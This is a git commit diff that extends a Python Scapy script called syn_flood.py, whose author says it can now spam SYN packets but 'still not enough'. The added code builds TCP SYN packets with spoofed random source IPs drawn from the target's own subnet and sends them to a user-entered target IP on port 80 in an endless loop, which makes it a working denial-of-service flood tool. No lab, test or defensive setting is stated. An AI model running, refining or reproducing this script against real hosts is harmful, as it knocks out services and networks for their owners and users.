1884b9de0e7cad9c7918e5488f2e57856b6b4feb
RobertJohnSoler <rsoler@hawk.iit.edu>
2024-12-26 23:30:15 -0600

    syn_flood can now spam syn packets but still not enough

--- syn_flood.py
+++ syn_flood.py
@@ -5,3 +5,8 @@ target_ip = input("Enter target IP: ")
 target_port = 80
 
 ip = IP(src=RandIP(f'{target_ip}/24'), dst = target_ip)
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)
+raw = Raw(b'Random data')
+syn_pack = ip/tcp/raw
+while True:
+    send(syn_pack)
